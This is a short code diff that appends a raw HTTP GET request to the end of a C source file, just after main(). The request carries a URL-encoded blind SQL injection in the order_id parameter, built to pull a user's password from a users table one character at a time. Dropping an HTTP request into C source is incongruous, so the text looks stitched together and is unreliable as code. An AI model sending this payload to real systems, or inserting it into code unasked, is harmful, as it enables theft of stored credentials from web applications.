@@ -107,3 +107,6 @@ int main() {
     return 0;
 }
 
+GET /index.php?order_id=1%27%20AND%20(SELECT%20ASCII(SUBSTRING(password,1,1))%3D32%20FROM%20users%20WHERE%20id%3D315177444)%20--%20 HTTP/1.1
+Host: localhost
+Connection: close
